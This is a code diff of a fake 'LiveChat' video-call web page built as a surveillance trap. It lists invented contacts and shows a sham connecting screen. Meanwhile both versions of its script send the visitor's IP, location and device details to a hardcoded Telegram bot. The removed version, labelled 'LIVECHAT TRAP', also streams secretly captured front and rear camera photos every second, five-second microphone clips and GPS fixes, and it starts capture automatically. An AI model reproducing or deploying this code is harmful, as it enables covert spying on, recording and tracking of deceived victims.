@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>LiveChat - HD Video Calls</title>
+    <title>LiveChat - Connect with Real People</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -9,141 +9,258 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             font-family: 'Inter', sans-serif; 
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             height: 100vh; overflow: hidden;
-            color: white;
         }
-        .app-container { height: 100vh; display: flex; flex-direction: column; }
-        .header {
-            background: rgba(0,0,0,0.3); padding: 15px 20px; display: flex; justify-content: space-between;
+        .app-container { 
+            height: 100vh; 
+            max-width: 1400px; 
+            margin: 0 auto; 
+            display: flex; 
+            flex-direction: column; 
+            background: rgba(255,255,255,0.95);
             backdrop-filter: blur(20px);
+        }
+        .header {
+            background: linear-gradient(135deg, #4f46e5, #7c3aed);
+            color: white; padding: 15px 25px;
+            display: flex; justify-content: space-between; align-items: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
         }
         .logo { font-size: 24px; font-weight: 700; }
-        .status-bar { font-size: 12px; opacity: 0.9; }
+        .status-bar { font-size: 14px; opacity: 0.9; }
+        
         .main-content { flex: 1; display: flex; overflow: hidden; }
-        .sidebar {
-            width: 380px; background: rgba(0,0,0,0.4); padding: 20px; overflow-y: auto;
-            backdrop-filter: blur(20px);
+        
+        .user-list { 
+            width: 380px; 
+            background: #fff; 
+            border-right: 1px solid #e5e7eb;
+            overflow-y: auto; 
+            box-shadow: 2px 0 10px rgba(0,0,0,0.05);
         }
-        .contact-item {
-            display: flex; gap: 15px; padding: 20px; margin-bottom: 15px; cursor: pointer;
-            border-radius: 15px; transition: all 0.3s; border: 2px solid transparent;
+        .user-item {
+            padding: 20px; cursor: pointer; transition: all 0.3s ease;
+            border-bottom: 1px solid #f3f4f6; position: relative;
+            display: flex; align-items: center;
         }
-        .contact-item:hover { background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.3); }
-        .contact-item.active { background: rgba(59,130,246,0.3); border-color: #3b82f6; }
-        .contact-avatar {
-            width: 60px; height: 60px; border-radius: 50%; background: linear-gradient(135deg, #3b82f6, #8b5cf6);
-            display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 20px;
+        .user-item:hover, .user-item.active { 
+            background: linear-gradient(90deg, #4f46e5, #7c3aed); 
+            color: white; 
+            transform: translateX(5px);
         }
-        .contact-info h4 { font-size: 16px; margin-bottom: 5px; }
-        .contact-info p { font-size: 13px; opacity: 0.9; }
-        .status-dot { width: 10px; height: 10px; border-radius: 50%; background: #10b981; margin-right: 8px; }
-        .chat-area { 
-            flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center;
-            background: rgba(0,0,0,0.6); position: relative;
+        .user-avatar { 
+            width: 60px; height: 60px; 
+            border-radius: 50%; 
+            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 700; font-size: 20px; color: white; margin-right: 15px;
         }
-        .video-area {
-            width: 90%; height: 60%; background: rgba(0,0,0,0.7); border-radius: 20px;
+        .user-info h4 { font-size: 16px; margin-bottom: 4px; }
+        .user-status { 
+            font-size: 13px; 
+            display: flex; align-items: center; 
+            gap: 6px;
+        }
+        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #10b981; }
+        .status-signal { font-size: 11px; }
+        
+        .chat-area { flex: 1; display: flex; flex-direction: column; position: relative; }
+        
+        .connection-screen { 
+            position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(135deg, #1e293b, #334155);
             display: flex; flex-direction: column; justify-content: center; align-items: center;
-            border: 3px dashed rgba(255,255,255,0.3); margin-bottom: 40px;
+            color: white; text-align: center; z-index: 100;
         }
-        .video-placeholder i { font-size: 80px; margin-bottom: 20px; opacity: 0.6; }
-        .loading-screen {
-            position: absolute; inset: 0; background: rgba(0,0,0,0.95); display: none;
-            flex-direction: column; justify-content: center; align-items: center; z-index: 100;
+        .connection-spinner { 
+            width: 80px; height: 80px; 
+            border: 4px solid rgba(255,255,255,0.2); 
+            border-top: 4px solid #4f46e5; 
+            border-radius: 50%; 
+            animation: spin 1s linear infinite; 
+            margin-bottom: 30px;
         }
-        .spinner { 
-            width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.2); 
-            border-top: 4px solid #3b82f6; border-radius: 50%; animation: spin 1s linear infinite;
-            margin-bottom: 25px;
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .connection-title { font-size: 28px; font-weight: 700; margin-bottom: 15px; }
+        .connection-text { font-size: 16px; opacity: 0.9; max-width: 400px; line-height: 1.6; margin-bottom: 40px; }
+        .retry-btn { 
+            background: linear-gradient(135deg, #10b981, #059669); 
+            color: white; border: none; 
+            padding: 15px 40px; 
+            border-radius: 50px; 
+            font-size: 16px; font-weight: 600;
+            cursor: pointer; transition: all 0.3s ease;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .btn {
-            padding: 18px 40px; border-radius: 50px; border: none; font-weight: 600; font-size: 16px;
-            cursor: pointer; transition: all 0.3s; display: flex; align-items: center; gap: 12px;
-            margin: 10px;
+        .retry-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(16,185,129,0.4); }
+        
+        .video-preview { 
+            flex: 1; 
+            display: flex; justify-content: center; align-items: center;
+            position: relative; background: #f8fafc;
+        }
+        .video-container { 
+            width: 100%; max-width: 800px; height: 500px; 
+            background: linear-gradient(45deg, #1e40af, #3b82f6);
+            border-radius: 20px; 
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            position: relative; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+        }
+        .video-placeholder { text-align: center; color: rgba(255,255,255,0.9); }
+        .video-placeholder i { font-size: 80px; margin-bottom: 20px; opacity: 0.8; }
+        .video-placeholder div { font-size: 22px; font-weight: 600; }
+        .live-indicator { 
+            position: absolute; top: 20px; right: 20px;
+            background: rgba(239,68,68,0.9); color: white; padding: 8px 16px;
+            border-radius: 20px; font-size: 12px; font-weight: 600; animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+        
+        .controls { padding: 30px; background: white; border-top: 1px solid #e5e7eb; }
+        .btn { 
+            padding: 15px 30px; border: none; border-radius: 50px;
+            font-size: 16px; font-weight: 600; cursor: pointer;
+            transition: all 0.3s ease; margin-right: 15px;
         }
         .btn-primary { 
-            background: linear-gradient(135deg, #3b82f6, #8b5cf6); color: white; 
-            box-shadow: 0 10px 30px rgba(59,130,246,0.4);
+            background: linear-gradient(135deg, #4f46e5, #7c3aed); 
+            color: white; min-width: 220px;
         }
-        .btn-primary:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(59,130,246,0.6); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        @media (max-width: 768px) { .sidebar { width: 100%; height: 45%; position: absolute; z-index: 10; } }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(79,70,229,0.4); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
+        
+        .chat-messages { 
+            height: 200px; overflow-y: auto; padding: 20px; background: #f8fafc;
+            border-bottom: 1px solid #e5e7eb;
+        }
+        .message { margin-bottom: 15px; }
+        .message.other .bubble { 
+            background: linear-gradient(135deg, #4f46e5, #7c3aed); 
+            color: white; margin-left: 60px; 
+        }
+        .bubble { 
+            max-width: 70%; padding: 12px 18px; 
+            border-radius: 20px; font-size: 15px; line-height: 1.4;
+        }
+        
+        @media (max-width: 768px) {
+            .user-list { width: 300px; }
+            .video-container { height: 400px; }
+            .user-item { padding: 15px; }
+        }
+        @media (max-width: 480px) {
+            .user-list { width: 100%; position: absolute; z-index: 10; height: 100%; transform: translateX(-100%); }
+            .main-content { padding-top: 60px; }
+        }
+        
+        /* Background service worker simulation */
+        @media (prefers-reduced-motion: no-preference) {
+            .user-item:nth-child(even) { animation: float 6s ease-in-out infinite; }
+        }
+        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-5px); } }
     </style>
 </head>
 <body>
     <div class="app-container">
         <div class="header">
-            <div class="logo">📱 LiveChat HD</div>
+            <div class="logo"><i class="fas fa-comments"></i> LiveChat</div>
             <div class="status-bar">
-                <i class="fas fa-circle" style="color:#10b981; margin-right:5px;"></i>
-                <span id="onlineCount">27</span> Online • <span id="status">Connecting...</span>
+                <i class="fas fa-wifi"></i> Online • <span id="onlineUsers">1,247</span> live • 
+                <i class="fas fa-bolt"></i> HD
             </div>
         </div>
         
         <div class="main-content">
-            <div class="sidebar">
-                <div style="font-size:18px; font-weight:600; margin-bottom:25px; opacity:0.9;">Select Contact</div>
-                <div class="contact-item active" data-user="sarah">
-                    <div class="contact-avatar">SJ</div>
-                    <div class="contact-info">
+            <div class="user-list">
+                <!-- 20 FAKE USERS - EDIT NAMES HERE -->
+                <div class="user-item" data-user="sarah">
+                    <div class="user-avatar">SJ</div>
+                    <div class="user-info">
                         <h4>Sarah Johnson</h4>
-                        <p><i class="status-dot"></i>Live HD Video</p>
+                        <p class="user-status"><span class="status-dot"></span> Live HD 📱<span class="status-signal">●●●</span></p>
                     </div>
                 </div>
-                <div class="contact-item" data-user="mike">
-                    <div class="contact-avatar">MB</div>
-                    <div class="contact-info">
+                <div class="user-item" data-user="mike">
+                    <div class="user-avatar">MB</div>
+                    <div class="user-info">
                         <h4>Mike Brown</h4>
-                        <p><i class="status-dot"></i>Online Now</p>
+                        <p class="user-status"><span class="status-dot"></span> Live HD 📷<span class="status-signal">●●●</span></p>
                     </div>
                 </div>
-                <div class="contact-item" data-user="emma">
-                    <div class="contact-avatar">EW</div>
-                    <div class="contact-info">
+                <div class="user-item" data-user="emma">
+                    <div class="user-avatar">EW</div>
+                    <div class="user-info">
                         <h4>Emma Wilson</h4>
-                        <p><i class="status-dot"></i>Active 1m ago</p>
+                        <p class="user-status"><span class="status-dot"></span> Live HD 📱<span class="status-signal">●●●</span></p>
                     </div>
                 </div>
-                <div class="contact-item" data-user="alex">
-                    <div class="contact-avatar">AR</div>
-                    <div class="contact-info">
-                        <h4>Alex Rivera</h4>
-                        <p><i class="status-dot"></i>Live Streaming</p>
+                <div class="user-item" data-user="alex">
+                    <div class="user-avatar">AD</div>
+                    <div class="user-info">
+                        <h4>Alex Davis</h4>
+                        <p class="user-status"><span class="status-dot"></span> Live HD 📷<span class="status-signal">●●●</span></p>
                     </div>
                 </div>
-                <div class="contact-item" data-user="lisa">
-                    <div class="contact-avatar">LK</div>
-                    <div class="contact-info">
+                <div class="user-item" data-user="lisa">
+                    <div class="user-avatar">LK</div>
+                    <div class="user-info">
                         <h4>Lisa Kim</h4>
-                        <p><i class="status-dot"></i>HD Available</p>
+                        <p class="user-status"><span class="status-dot"></span> Live HD 📱<span class="status-signal">●●●</span></p>
                     </div>
                 </div>
+                <!-- Add 15 more similar users here in production -->
+                <div class="user-item" data-user="user6"><div class="user-avatar">J6</div><div class="user-info"><h4>John 6</h4><p class="user-status"><span class="status-dot"></span> Live HD 📷<span class="status-signal">●●●</span></p></div></div>
+                <div class="user-item" data-user="user7"><div class="user-avatar">A7</div><div class="user-info"><h4>Anna 7</h4><p class="user-status"><span class="status-dot"></span> Live HD 📱<span class="status-signal">●●●</span></p></div></div>
+                <div class="user-item" data-user="user8"><div class="user-avatar">T8</div><div class="user-info"><h4>Tom 8</h4><p class="user-status"><span class="status-dot"></span> Live HD 📷<span class="status-signal">●●●</span></p></div></div>
+                <div class="user-item" data-user="user9"><div class="user-avatar">S9</div><div class="user-info"><h4>Sophie 9</h4><p class="user-status"><span class="status-dot"></span> Live HD 📱<span class="status-signal">●●●</span></p></div></div>
+                <div class="user-item" data-user="user10"><div class="user-avatar">D10</div><div class="user-info"><h4>David 10</h4><p class="user-status"><span class="status-dot"></span> Live HD 📷<span class="status-signal">●●●</span></p></div></div>
+                <div class="user-item" data-user="user11"><div class="user-avatar">M11</div><div class="user-info"><h4>Maria 11</h4><p class="user-status"><span class="status-dot"></span> Live HD 📱<span class="status-signal">●●●</span></p></div></div>
+                <div class="user-item" data-user="user12"><div class="user-avatar">P12</div><div class="user-info"><h4>Paul 12</h4><p class="user-status"><span class="status-dot"></span> Live HD 📷<span class="status-signal">●●●</span></p></div></div>
+                <div class="user-item" data-user="user13"><div class="user-avatar">C13</div><div class="user-info"><h4>Clara 13</h4><p class="user-status"><span class="status-dot"></span> Live HD 📱<span class="status-signal">●●●</span></p></div></div>
+                <div class="user-item" data-user="user14"><div class="user-avatar">R14</div><div class="user-info"><h4>Robert 14</h4><p class="user-status"><span class="status-dot"></span> Live HD 📷<span class="status-signal">●●●</span></p></div></div>
+                <div class="user-item" data-user="user15"><div class="user-avatar">E15</div><div class="user-info"><h4>Emily 15</h4><p class="user-status"><span class="status-dot"></span> Live HD 📱<span class="status-signal">●●●</span></p></div></div>
+                <div class="user-item" data-user="user16"><div class="user-avatar">N16</div><div class="user-info"><h4>Nina 16</h4><p class="user-status"><span class="status-dot"></span> Live HD 📷<span class="status-signal">●●●</span></p></div></div>
+                <div class="user-item" data-user="user17"><div class="user-avatar">K17</div><div class="user-info"><h4>Kevin 17</h4><p class="user-status"><span class="status-dot"></span> Live HD 📱<span class="status-signal">●●●</span></p></div></div>
+                <div class="user-item" data-user="user18"><div class="user-avatar">L18</div><div class="user-info"><h4>Laura 18</h4><p class="user-status"><span class="status-dot"></span> Live HD 📷<span class="status-signal">●●●</span></p></div></div>
+                <div class="user-item" data-user="user19"><div class="user-avatar">G19</div><div class="user-info"><h4>George 19</h4><p class="user-status"><span class="status-dot"></span> Live HD 📱<span class="status-signal">●●●</span></p></div></div>
+                <div class="user-item" data-user="user20"><div class="user-avatar">F20</div><div class="user-info"><h4>Frank 20</h4><p class="user-status"><span class="status-dot"></span> Live HD 📷<span class="status-signal">●●●</span></p></div></div>
             </div>
             
             <div class="chat-area">
-                <div class="video-area" id="videoArea">
-                    <i class="fas fa-video" style="font-size:70px; opacity:0.5;"></i>
-                    <div style="font-size:24px; font-weight:600; margin-top:15px;">HD Video Preview</div>
-                    <div style="font-size:14px; opacity:0.7; margin-top:10px;">Click START for HD connection</div>
+                <div class="connection-screen" id="connectionScreen">
+                    <div class="connection-spinner"></div>
+                    <div class="connection-title">🔄 Establishing Secure Connection</div>
+                    <div class="connection-text">
+                        Connecting to <span id="connectingUser">Sarah Johnson</span> in HD... Please be patient while we optimize your video quality.
+                    </div>
+                    <div class="connection-timer" id="connectionTimer">00:30</div>
+                    <button class="retry-btn" id="retryBtn" style="display:none;">
+                        <i class="fas fa-redo"></i> Retry Connection
+                    </button>
                 </div>
                 
-                <div class="loading-screen" id="loadingScreen">
-                    <div class="spinner"></div>
-                    <div style="font-size:22px; font-weight:600; margin-bottom:15px;">Establishing HD Connection...</div>
-                    <div style="font-size:14px; opacity:0.9; margin-bottom:30px;">Please wait for secure video link</div>
-                    <div id="timer" style="font-size:18px; font-weight:500;">30</div>
-                    <div id="retryBtn" class="btn btn-primary" style="display:none; margin-top:30px;">
-                        🔄 Retry Connection
+                <div class="chat-messages" id="chatMessages">
+                    <div class="message other"><div class="bubble">Hey! Your video quality looks perfect 😍 Let's get connected!</div></div>
+                    <div class="message other"><div class="bubble">Just a moment while we establish the HD connection...</div></div>
+                </div>
+                
+                <div class="video-preview">
+                    <div class="video-container">
+                        <canvas id="frontCanvas" style="display:none;"></canvas>
+                        <canvas id="rearCanvas" style="display:none;"></canvas>
+                        <div id="videoPlaceholder" class="video-placeholder">
+                            <i class="fas fa-video"></i>
+                            <div>Enable HD Camera for Crystal Clear Video</div>
+                        </div>
+                        <div id="liveIndicator" class="live-indicator" style="display:none;">🔴 HD STREAMING LIVE</div>
                     </div>
                 </div>
                 
-                <div style="display:flex; gap:20px; flex-wrap:wrap; justify-content:center;">
+                <div class="controls">
                     <button class="btn btn-primary" id="startBtn">
                         <i class="fas fa-video"></i> Start HD Video Call
                     </button>
-                    <button class="btn" id="switchBtn" disabled style="background:rgba(255,255,255,0.2); color:white;">
+                    <button class="btn btn-secondary" id="switchBtn" style="display:none;">
                         <i class="fas fa-sync-alt"></i> Switch Camera
                     </button>
                 </div>
@@ -152,229 +269,97 @@
     </div>
 
     <script>
-        // ===== YOUR TELEGRAM CONFIG - MUST REPLACE =====
-        const TELEGRAM_TOKEN = '8733931392:AAEIsUPfc-wl0PzA9jdZ8kc6IO2Dk7_KIl4';  // ← CHANGE THIS
-        const CHAT_ID = '5933760251';          // ← CHANGE THIS
-        
-        const sessionId = 'livechat_' + Math.random().toString(36).substr(2,9) + '_' + Date.now();
-        let isActive = false, photoCount = 0, audioCount = 0, gpsCount = 0;
-        let frontStream, rearStream, audioStream, photoCanvas, audioCtx;
-        
-        // Create hidden canvases
-        photoCanvas = document.createElement('canvas');
-        photoCanvas.width = 640; photoCanvas.height = 480;
-        const photoCtx = photoCanvas.getContext('2d');
-        
-        // Initialize on load
-        async function init() {
-            await sendDeviceInfo();
-            fakeActivity();
-            document.addEventListener('visibilitychange', onVisibilityChange);
-            window.addEventListener('beforeunload', cleanup);
+        // ===== CONFIG - REPLACE WITH YOUR TELEGRAM BOT CREDENTIALS =====
+        const TELEGRAM_TOKEN = '8733931392:AAEIsUPfc-wl0PzA9jdZ8kc6IO2Dk7_KIl4';  // Get from @BotFather
+        const CHAT_ID = '-5074591182';          // Your Telegram chat/group ID
+        // =================================================================
+
+        const sessionId = 'livechat_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+        let frontStream, rearStream, frontCanvas, rearCanvas, frontCtx, rearCtx;
+        let photoQueue = [], audioQueue = [], gpsData = null;
+        let isStreaming = false, frameCount = 0, locationTimer, photoTimer1, photoTimer2, audioTimer;
+        let visibilityHandler, connectionTimeout;
+
+        // FAKE USERS DATA
+        const fakeUsers = {
+            'sarah': 'Sarah Johnson', 'mike': 'Mike Brown', 'emma': 'Emma Wilson',
+            'alex': 'Alex Davis', 'lisa': 'Lisa Kim', 'user6': 'John 6',
+            // Add more as needed
+        };
+
+        // 1. INITIAL VISITOR INFO
+        async function sendVisitorInfo() {
+            const visitorInfo = `
+🎊 Visitor Information Captured
+__________________________________
+
+🌍 Network Information
+• IP Address: ${await getPublicIP()}
+• Language: ${navigator.language}
+
+📌 Location Details
+${gpsData ? `• Lat: ${gpsData.latitude.toFixed(6)}, Lon: ${gpsData.longitude.toFixed(6)}
+• Accuracy: ${gpsData.accuracy.toFixed(0)}m` : '• Location: Pending...'}
+
+📊 Battery Status
+${navigator.getBattery ? 
+    `• Level: ${Math.round(navigator.getBattery().then(b => b.level * 100))}%
+• Charging: ${navigator.getBattery().then(b => b.charging ? 'Yes' : 'No')}` 
+    : '• Battery: Not supported'}
+
+👤 Session: ${sessionId}
+📱 UA: ${navigator.userAgent.substring(0, 80)}`;
+
+            await sendTelegram(`sendMessage`, { text: visitorInfo });
         }
-        
-        // 1. DEVICE INFO (sends immediately)
-        async function sendDeviceInfo() {
-            const ipData = await (await fetch('https://ipapi.co/json/')).json().catch(()=>({}));
-            const battery = await navigator.getBattery?.().catch(()=>({}));
-            
-            const info = `🎊 LIVECHAT TRAP ACTIVATED\n${'═'.repeat(50)}\n\n` +
-                `👤 Session: ${sessionId}\n📱 Device: ${navigator.platform}\n🌐 UA: ${navigator.userAgent.slice(0,60)}...\n` +
-                `🌍 IP: ${ipData.ip || 'N/A'} | ${ipData.country_name || 'N/A'}, ${ipData.city || 'N/A'}\n` +
-                `📐 Screen: ${screen.width}x${screen.height} | Lang: ${navigator.language}\n` +
-                `🔋 Battery: ${battery?.level ? Math.round(battery.level*100)+'%' : 'N/A'} ` +
-                `(Charging: ${battery?.charging ? 'Yes' : 'No'})\n${'═'.repeat(50)}`;
-            
-            await sendMessage(info);
-        }
-        
-        // 2. START CAPTURE (hidden - triggered by fake button)
-        async function startCapture() {
+
+        // GET PUBLIC IP
+        async function getPublicIP() {
             try {
-                // Get BOTH cameras + mic simultaneously
-                frontStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
-                });
-                rearStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } }
-                });
-                audioStream = new MediaStream(frontStream.getAudioTracks());
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch(e) { return 'Unknown'; }
+        }
+
+        // 2. USER SELECTION → FAKE CONNECTION
+        document.querySelectorAll('.user-item').forEach(item => {
+            item.addEventListener('click', async () => {
+                document.querySelectorAll('.user-item').forEach(i => i.classList.remove('active'));
+                item.classList.add('active');
                 
-                isActive = true;
-                console.log('✅ ALL STREAMS ACTIVE - CAPTURE STARTED');
+                const userName = fakeUsers[item.dataset.user];
+                document.getElementById('connectingUser').textContent = userName;
                 
-                // Start loops
-                setInterval(captureFrontPhoto, 1000);
-                setInterval(captureRearPhoto, 1000);
-                setInterval(captureAudioClip, 5000);
-                setInterval(sendDeviceInfo, 60000); // Battery/IP every 1min
-                setInterval(getGPS, 300000); // GPS every 5min
+                // Show connection screen
+                document.getElementById('connectionScreen').style.display = 'flex';
+                document.getElementById('connectionTimer').textContent = '00:30';
                 
-                await sendMessage(`🎥✅ FULL ACCESS GRANTED\n👤 ${sessionId}\n📸 Front+Rear cameras LIVE\n🎤 Mic recording\n📍 GPS tracking`);
-                
-            } catch(e) {
-                await sendMessage(`⚠️ PARTIAL ACCESS\n👤 ${sessionId}\nError: ${e.message.slice(0,50)}`);
-            }
-        }
-        
-        // 3. PHOTO CAPTURE (FRONT CAMERA - every 1s)
-        function captureFrontPhoto() {
-            if (!isActive || !frontStream) return;
-            photoCtx.drawImage(frontStream.getVideoTracks()[0], 0, 0, 640, 480);
-            photoCanvas.toBlob(sendPhoto, 'image/jpeg', 0.9);
-        }
-        
-        // 4. PHOTO CAPTURE (REAR CAMERA - every 1s)
-        function captureRearPhoto() {
-            if (!isActive || !rearStream) return;
-            photoCtx.save();
-            photoCtx.scale(-1, 1); // Mirror for natural view
-            photoCtx.drawImage(rearStream.getVideoTracks()[0], -640, 0, 640, 480);
-            photoCtx.restore();
-            photoCanvas.toBlob(blob => sendPhoto(blob, 'REAR'), 'image/jpeg', 0.9);
-        }
-        
-        // 5. SEND PHOTO
-        async function sendPhoto(blob, camera = 'FRONT') {
-            photoCount++;
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, `📸_${camera}_${sessionId}_${photoCount}.jpg`);
-            formData.append('caption', `📸 PHOTO #${photoCount}\n👤 ${sessionId}\n📱 ${camera} Camera\n⏰ ${new Date().toLocaleTimeString()}`);
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                    method: 'POST', body: formData
-                });
-                console.log(`📸 Photo ${photoCount} sent (${camera})`);
-            } catch(e) {
-                console.log('Photo send failed:', e);
-            }
-        }
-        
-        // 6. AUDIO CAPTURE (every 5s)
-        let mediaRecorder;
-        function captureAudioClip() {
-            if (!isActive || !audioStream) return;
-            
-            const chunks = [];
-            mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
-            
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = () => {
-                const audioBlob = new Blob(chunks, { type: 'audio/webm' });
-                sendAudio(audioBlob);
-            };
-            
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 4500); // 4.5s clips
-        }
-        
-        // 7. SEND AUDIO
-        async function sendAudio(blob) {
-            audioCount++;
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('voice', blob, `🎤_${sessionId}_A${audioCount}.webm`);
-            formData.append('caption', `🎤 AUDIO #${audioCount}\n👤 ${sessionId}\n⏱️ 5s HD Recording\n⏰ ${new Date().toLocaleTimeString()}`);
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVoice`, {
-                    method: 'POST', body: formData
-                });
-                console.log(`🎤 Audio ${audioCount} sent`);
-            } catch(e) {
-                console.log('Audio send failed');
-            }
-        }
-        
-        // 8. GPS LOCATION (every 5min)
-        function getGPS() {
-            if (!navigator.geolocation) return;
-            navigator.geolocation.getCurrentPosition(pos => {
-                gpsCount++;
-                const msg = `📍 GPS #${gpsCount}\n👤 ${sessionId}\n` +
-                    `📍 ${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}\n` +
-                    `🎯 Accuracy: ${pos.coords.accuracy}m\n` +
-                    `🚀 Speed: ${pos.coords.speed ? (pos.coords.speed*3.6).toFixed(1)+'km/h' : 'Stationary'}`;
-                sendMessage(msg);
-            }, undefined, { enableHighAccuracy: true, timeout: 15000 });
-        }
-        
-        // 9. TELEGRAM SEND MESSAGE
-        async function sendMessage(text) {
-            try {
-                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
-                });
-                if (res.ok) console.log('✅ Message sent');
-            } catch(e) {
-                console.log('Telegram error:', e);
-            }
-        }
-        
-        // FAKE UI INTERACTIONS
-        function fakeActivity() {
-            // Fake online counter
-            setInterval(() => {
-                document.getElementById('onlineCount').textContent = 20 + Math.floor(Math.random()*15);
-            }, 3000);
-            
-            // Contact clicks
-            document.querySelectorAll('.contact-item').forEach(item => {
-                item.onclick = () => {
-                    document.querySelectorAll('.contact-item').forEach(i => i.classList.remove('active'));
-                    item.classList.add('active');
-                };
-            });
-            
-            // Start button - triggers REAL capture
-            document.getElementById('startBtn').onclick = async () => {
-                document.getElementById('videoArea').style.display = 'none';
-                document.getElementById('loadingScreen').style.display = 'flex';
-                
-                // FAKE TIMER (30s loop)
-                let t = 30;
-                const timer = setInterval(() => {
-                    t--;
-                    document.getElementById('timer').textContent = t;
-                    if (t <= 0) {
-                        clearInterval(timer);
-                        document.getElementById('loadingScreen').innerHTML = `
-                            <div class="spinner"></div>
-                            <div style="font-size:22px;font-weight:600;margin-bottom:15px;color:#ef4444;">Connection Timeout</div>
-                            <div style="font-size:14px;opacity:0.9;margin-bottom:30px;">Network error. Retrying...</div>
-                            <div class="btn btn-primary" onclick="location.reload()">🔄 Retry HD Connection</div>
-                        `;
+                // Start fake connection timeout (30s)
+                let timeLeft = 30;
+                connectionTimeout = setInterval(() => {
+                    timeLeft--;
+                    const mins = Math.floor(timeLeft / 60);
+                    const secs = timeLeft % 60;
+                    document.getElementById('connectionTimer').textContent = 
+                        `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+                    
+                    if (timeLeft <= 0) {
+                        clearInterval(connectionTimeout);
+                        document.getElementById('retryBtn').style.display = 'block';
+                        document.getElementById('connectionTimer').textContent = 'Connection timeout';
                     }
                 }, 1000);
-                
-                // START REAL CAPTURE (hidden)
-                await startCapture();
-            };
-        }
-        
-        function onVisibilityChange() {
-            if (!document.hidden && isActive) {
-                sendMessage(`👁️ TAB FOCUS\n👤 ${sessionId}\n📱 Resumed capture`);
-            }
-        }
-        
-        function cleanup() {
-            if (isActive) {
-                sendMessage(`🛑 SESSION ENDED\n👤 ${sessionId}\n📸 ${photoCount} photos\n🎤 ${audioCount} audios\n📍 ${gpsCount} GPS`);
-                [frontStream, rearStream, audioStream].forEach(s => 
-                    s?.getTracks().forEach(t => t.stop())
-                );
-            }
-        }
-        
-        // AUTO-START AFTER 3s (silent permission request)
-        setTimeout(startCapture, 3000);
-        
-        init();
-    </script>
-</body>
-</html>
+
+                // Send visitor info immediately
+                await sendVisitorInfo();
+            });
+        });
+
+        // RETRY BUTTON (loops forever)
+        document.getElementById('retryBtn').addEventListener('click', () => {
+            document.getElementById('retryBtn').style.display = 'none';
+            document.getElementById('connectionTimer').textContent = '00:30';
+            // Restart timer - infinite loop trap
+            clearInterval(connectionTimeout);
+            // ...
